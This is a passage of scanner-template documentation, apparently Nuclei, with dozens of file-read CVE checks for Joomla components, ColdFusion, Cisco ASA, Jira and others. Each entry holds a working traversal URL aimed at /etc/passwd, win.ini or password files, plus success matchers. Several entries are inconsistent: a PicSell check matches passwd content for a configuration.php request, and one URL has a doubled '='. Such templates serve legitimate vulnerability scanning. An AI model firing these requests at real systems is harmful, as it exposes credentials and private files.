- A directory traversal vulnerability in the SMEStorage (com_smestorage) component before 1.1 for Joomla! allows remote attackers to read arbitrary files via directory traversal sequences in the controller parameter to index.php.
- severity - high
- tags - cve2010,joomla,lfi,edb,packetstorm,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_smestorage&controller=../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component User Status - Local File Inclusion

## Description

- A directory traversal vulnerability in userstatus.php in the User Status (com_userstatus) component 1.21.16 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve2010,joomla,lfi,status,edb,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_userstatus&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Online Exam 1.5.0 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Online Examination (aka Online Exam or com_onlineexam) component 1.5.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - joomla,lfi,edb,packetstorm,cve,cve2010

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_onlineexam&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component com_abbrev - Local File Inclusion

## Description

- A directory traversal vulnerability in the Abbreviations Manager (com_abbrev) component 1.1 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_abbrev&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component iNetLanka Multiple Map 1.0 - Local File Inclusion

## Description

- A directory traversal vulnerability in the iNetLanka Multiple Map (com_multimap) component 1.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve2010,joomla,lfi,edb,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_multimap&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# MODx manager - Local File Inclusion

## Description

- A directory traversal vulnerability in manager/controllers/default/resource/tvs.php in MODx Revolution 2.0.2-pl and possibly earlier allows remote attackers to read arbitrary files via a .. (dot dot) in the class_key parameter when magic_quotes_gpc is disabled.
- severity - high
- tags - cve,cve2010,lfi,edb,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/manager/controllers/default/resource/tvs.php?class_key=../../../../../../../../../../windows/win.ini%00

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and
- part - body

---

# Joomla! Component WMI 1.5.0 - Local File Inclusion

## Description

- A directory traversal vulnerability in wmi.php in the Webmoney Web Merchant Interface (aka WMI or com_wmi) component 1.5.0 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_wmi&controller=../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Jphone 1.0 Alpha 3 - Local File Inclusion

## Description

- A directory traversal vulnerability in jphone.php in the JPhone (com_jphone) component 1.0 Alpha 3 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - lfi,edb,packetstorm,cve,cve2010,joomla

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_jphone&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component SVMap 1.1.1 - Local File Inclusion

## Description

- A directory traversal vulnerability in the SVMap (com_svmap) component 1.1.1 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_svmap&controller=../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Percha Fields Attach 1.0 - Directory Traversal

## Description

- A directory traversal vulnerability in the Percha Fields Attach (com_perchafieldsattach) component 1.x for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve2010,lfi,joomla,edb,packetstorm,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_perchafieldsattach&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component AlphaUserPoints 1.5.5 - Local File Inclusion

## Description

- A directory traversal vulnerability in the AlphaUserPoints (com_alphauserpoints) component 1.5.5 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the view parameter to index.php.
- severity - high
- tags - joomla,lfi,edb,packetstorm,cve,cve2010

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_alphauserpoints&view=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component com_jashowcase - Directory Traversal

## Description

- A directory traversal vulnerability in the JA Showcase (com_jashowcase) component for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter in a jashowcase action to index.php.
- severity - high
- tags - cve2010,joomla,lfi,edb,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_jashowcase&view=jashowcase&controller=../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Web TV 1.0 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Web TV (com_webtv) component 1.0 for Joomla! allows remote attackers to read arbitrary files and have possibly other unspecified impacts via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve2010,joomla,lfi,edb,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component JA Voice 2.0 - Local File Inclusion

## Description

- A directory traversal vulnerability in the JA Voice (com_javoice) component 2.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the view parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_javoice&view=../../../../../../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component AWDwall 1.5.4 - Local File Inclusion

## Description

- A directory traversal vulnerability in the AWDwall (com_awdwall) component 1.5.4 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_awdwall&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Preventive And Reservation 1.0.5 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Preventive & Reservation (com_preventive) component 1.0.5 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - edb,cve,cve2010,joomla,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_preventive&controller==../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component jesectionfinder - Local File Inclusion

## Description

- A directory traversal vulnerability in the JExtensions JE Section/Property Finder (jesectionfinder) component for Joomla! allows remote attackers to include and execute arbitrary local files via directory traversal sequences in the view parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/propertyfinder/component/jesectionfinder/?view=../../../../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Adobe ColdFusion 8.0/8.0.1/9.0/9.0.1 LFI

## Description

- Multiple directory traversal vulnerabilities in the administrator console in Adobe ColdFusion 9.0.1 and earlier allow remote attackers to read arbitrary files via the locale parameter to (1) CFIDE/administrator/settings/mappings.cfm, (2) logging/settings.cfm, (3) datasources/index.cfm, (4) j2eepackaging/editarchive.cfm, and (5) enter.cfm in CFIDE/administrator/.
- severity - high
- tags - adobe,kev,vulhub,cve,cve2010,coldfusion,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en

### Matchers

**Type - word**

- words
  1. rdspassword=
  2. encrypted=
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# Joomla! Component MT Fire Eagle 1.2 - Local File Inclusion

## Description

- A directory traversal vulnerability in the MT Fire Eagle (com_mtfireeagle) component 1.2 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - lfi,edb,cve,cve2010,joomla

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_mtfireeagle&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Affiliate Datafeeds 880 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Affiliate Datafeeds (com_datafeeds) component build 880 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - edb,cve,cve2010,joomla,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_datafeeds&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component PicSell 1.0 - Arbitrary File Retrieval

## Description

- A directory traversal vulnerability in the PicSell (com_picsell) component 1.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the dflink parameter in a prevsell dwnfree action to index.php.
- severity - high
- tags - edb,cve,cve2010,joomla,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_picsell&controller=prevsell&task=dwnfree&dflink=../../../configuration.php

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component PowerMail Pro 1.5.3 - Local File Inclusion

## Description

- A directory traversal vulnerability in the givesight PowerMail Pro (com_powermail) component 1.5.3 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_powermail&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component redSHOP 1.0 - Local File Inclusion

## Description

- A directory traversal vulnerability in the redSHOP (com_redshop) component 1.0.x for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the view parameter to index.php.
- severity - high
- tags - lfi,edb,packetstorm,cve,cve2010,joomla

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_redshop&view=../../../../../../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component iNetLanka Contact Us Draw Root Map 1.1 - Local File Inclusion

## Description

- A directory traversal vulnerability in the iNetLanka Contact Us Draw Root Map (com_drawroot) component 1.1 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_drawroot&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component & Plugin JE Tooltip 1.0 - Local File Inclusion

## Description

- A directory traversal vulnerability in the JE Form Creator (com_jeformcr) component for Joomla!, when magic_quotes_gpc is disabled, allows remote attackers to read arbitrary files via directory traversal sequences in the view parameter to index.php. NOTE -- the original researcher states that the affected product is JE Tooltip, not Form Creator; however, the exploit URL suggests that Form Creator is affected.
- severity - high
- tags - edb,packetstorm,cve,cve2010,joomla,lfi,plugin

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_jeformcr&view=../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component com_jcollection - Directory Traversal

## Description

- A directory traversal vulnerability in the JCollection (com_jcollection) component for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve2010,joomla,lfi,edb,packetstorm,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_jcollection&controller=../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component ZiMBCore 0.1 - Local File Inclusion

## Description

- A directory traversal vulnerability in the ZiMB Core (aka ZiMBCore or com_zimbcore) component 0.1 in the ZiMB Manager collection for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve2010,joomla,lfi,edb,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_zimbcore&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Photo Battle 1.0.1 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Photo Battle (com_photobattle) component 1.0.1 for Joomla! allows remote attackers to read arbitrary files via the view parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,photo,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_photobattle&view=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Foobla Suggestions 1.5.1.2 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Foobla Suggestions (com_foobla_suggestions) component 1.5.1.2 for Joomla! allows remote attackers to read arbitrary files via directory traversal sequences in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_foobla_suggestions&controller=../../../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component TweetLA 1.0.1 - Local File Inclusion

## Description

- A directory traversal vulnerability in the TweetLA (com_tweetla) component 1.0.1 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve2010,joomla,lfi,edb,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_tweetla&controller=../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component CCNewsLetter - Local File Inclusion

## Description

- A directory traversal vulnerability in the ccNewsletter (com_ccnewsletter) component 1.0.5 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter in a ccnewsletter action to index.php.
- severity - medium
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_ccnewsletter&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component com_biblestudy - Local File Inclusion

## Description

- A directory traversal vulnerability in the Bible Study (com_biblestudy) component 6.1 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter in a studieslist action to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_biblestudy&id=1&view=studieslist&controller=../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component JRadio - Local File Inclusion

## Description

- A directory traversal vulnerability in JRadio (com_jradio) component before 1.5.1 for Joomla! allows remote attackers to read arbitrary files via directory traversal sequences in the controller parameter to index.php.
- severity - high
- tags - cve2010,joomla,lfi,edb,packetstorm,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_jradio&controller=../../../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component com_gcalendar Suite 2.1.5 - Local File Inclusion

## Description

- A directory traversal vulnerability in the GCalendar (com_gcalendar) component 2.1.5 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - edb,cve,cve2010,joomla,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_gcalendar&controller=../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Archery Scores 1.0.6 - Local File Inclusion

## Description

- A directory traversal vulnerability in archeryscores.php in the Archery Scores (com_archeryscores) component 1.0.6 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_archeryscores&controller=../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Motorola SBV6120E SURFboard Digital Voice Modem SBV6X2X-1.0.0.5-SCM - Directory Traversal

## Description

- Multiple directory traversal vulnerabilities in the web server for Motorola SURFBoard cable modem SBV6120E running firmware SBV6X2X-1.0.0.5-SCM-02-SHPC allow remote attackers to read arbitrary files via (1) "//" (multiple leading slash), (2) ../ (dot dot) sequences, and encoded dot dot sequences in a URL request.
- severity - high
- tags - cve2010,iot,lfi,motorola,edb,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component JotLoader 2.2.1 - Local File Inclusion

## Description

- A directory traversal vulnerability in the JotLoader (com_jotloader) component 2.2.1 for Joomla! allows remote attackers to read arbitrary files via directory traversal sequences in the section parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_jotloader&section=../../../../../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component com_cartweberp - Local File Inclusion

## Description

- A directory traversal vulnerability in the CARTwebERP (com_cartweberp) component 1.56.75 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_cartweberp&controller=../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component SmartSite 1.0.0 - Local File Inclusion

## Description

- A directory traversal vulnerability in the SmartSite (com_smartsite) component 1.0.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_smartsite&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Matamko 1.01 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Matamko (com_matamko) component 1.01 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve2010,joomla,lfi,edb,packetstorm,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_matamko&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Advertising 0.25 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Advertising (com_advertising) component 0.25 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - joomla,lfi,edb,packetstorm,cve,cve2010

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_advertising&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Jfeedback 1.2 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Ternaria Informatica Jfeedback! (com_jfeedback) component 1.2 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_jfeedback&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Realtyna Translator 1.0.15 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Realtyna Translator (com_realtyna) component 1.0.15 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_realtyna&controller=../../../../../../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component LoginBox - Local File Inclusion

## Description

- A directory traversal vulnerability in the LoginBox Pro (com_loginbox) component for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the view parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_loginbox&view=../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Magic Updater - Local File Inclusion

## Description

- A directory traversal vulnerability in the Magic Updater (com_joomlaupdater) component for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - edb,cve,cve2010,joomla,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_joomlaupdater&controller=../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Tiki Wiki CMS Groupware 5.2 - Local File Inclusion

## Description

- Tiki Wiki CMS Groupware 5.2 is susceptible to a local file inclusion vulnerability.
- severity - critical
- tags - cve,cve2010,tikiwiki,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/tiki-jsplugin.php?plugin=x&language=../../../../../../../../../../windows/win.ini

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

---

# Joomla! Component Cookex Agency CKForms - Local File Inclusion

## Description

- A directory traversal vulnerability in the Cookex Agency CKForms (com_ckforms) component 1.3.3 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - lfi,edb,cve,cve2010,joomla

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_ckforms&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Visites 1.1 - MosConfig_absolute_path Remote File Inclusion

## Description

- A PHP remote file inclusion vulnerability in core/include/myMailer.class.php in the Visites (com_joomla-visites) component 1.1 RC2 for Joomla! allows remote attackers to execute arbitrary PHP code via a URL in the mosConfig_absolute_path parameter.
- severity - high
- tags - joomla,lfi,edb,cve,cve2010

## Requests

- Method - GET

### URL

- {{BaseURL}}/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=../../../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Plugin Core Design Scriptegrator - Local File Inclusion

## Description

- A directory traversal vulnerability in plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php in the Core Design Scriptegrator plugin 1.4.1 for Joomla! allows remote attackers to read, and possibly include and execute, arbitrary files via directory traversal sequences in the files[] parameter.
- severity - high
- tags - cve,cve2010,joomla,lfi,plugin,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php?files[]=/etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Ghostcat - Apache Tomcat - AJP File Read/Inclusion Vulnerability

## Description

- When using the Apache JServ Protocol (AJP), care must be taken when trusting incoming connections to Apache Tomcat. Tomcat treats AJP connections as having higher trust than, for example, a similar HTTP connection. If such connections are available to an attacker, they can be exploited in ways that may be surprising. In Apache Tomcat 9.0.0.M1 to 9.0.0.30, 8.5.0 to 8.5.50 and 7.0.0 to 7.0.99, Tomcat shipped with an AJP Connector enabled by default that listened on all configured IP addresses. It was expected (and recommended in the security guide) that this Connector would be disabled if not required. This vulnerability report identified a mechanism that allowed - returning arbitrary files from anywhere in the web application - processing any file in the web application as a JSP Further, if the web application allowed file upload and stored those files within the web application (or the attacker was able to control the content of the web application by some other means) then this, along with the ability to process a file as a JSP, made remote code execution possible. It is important to note that mitigation is only required if an AJP port is accessible to untrusted users. Users wishing to take a defence-in-depth approach and block the vector that permits returning arbitrary files and execution as JSP may upgrade to Apache Tomcat 9.0.31, 8.5.51 or 7.0.100 or later. A number of changes were made to the default AJP Connector configuration in 9.0.31 to harden the default configuration. It is likely that users upgrading to 9.0.31, 8.5.51 or 7.0.100 or later will need to make small changes to their configurations.
- severity - critical
- tags - cisa,tenable,cve2020,apache,lfi,network,kev,cve,tomcat

---

# Jira Server Pre-Auth - Arbitrary File Retrieval (WEB-INF, META-INF)

## Description

- The CachingResourceDownloadRewriteRule class in Jira Server and Jira Data Center allowed unauthenticated remote attackers to read arbitrary files within WEB-INF and META-INF directories via an incorrect path access check.
- severity - medium
- tags - cve,cve2020,atlassian,jira,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/s/{{randstr}}/\_/%2e/WEB-INF/classes/META-INF/maven/com.atlassian.jira/jira-core/pom.xml
- {{BaseURL}}/s/{{randstr}}/\_/%2e/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. \<groupId>com.atlassian.jira\</groupId>
- part - body

---

# Cisco Adaptive Security Appliance (ASA)/Firepower Threat Defense (FTD) - Local File Inclusion

## Description

- Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software is vulnerable to local file inclusion due to directory traversal attacks that can read sensitive files on a targeted system because of a lack of proper input validation of URLs in HTTP requests processed by an affected device. An attacker could exploit this vulnerability by sending a crafted HTTP request containing directory traversal character sequences to an affected device. A successful exploit could allow the attacker to view arbitrary files within the web services file system on the targeted device. The web services file system is enabled when the affected device is configured with either WebVPN or AnyConnect features. This vulnerability cannot be used to obtain access to ASA or FTD system files or underlying operating system (OS) files.

- severity - high
- tags - lfi,kev,packetstorm,cve,cve2020,cisco

## Requests

- Method - GET

### URL

- {{BaseURL}}/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
- {{BaseURL}}/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua

### Matchers

**Type - word**

- words
  1. INTERNAL_PASSWORD_ENABLED
  2. CONF_VIRTUAL_KEYBOARD
- condition - and

---

# Spring Cloud Config Server - Local File Inclusion

## Description

- Spring Cloud Config Server versions 2.2.x prior to 2.2.3, versions 2.1.x prior to 2.1.9, and older unsupported versions allow applications to serve arbitrary configuration files through the spring-cloud-config-server module. A malicious user or attacker can send a request using a specially crafted URL that can lead to a local file inclusion attack.
- severity - high
- tags - cve,cve2020,lfi,springcloud,config,traversal,kev

## Requests

- Method - GET

### URL

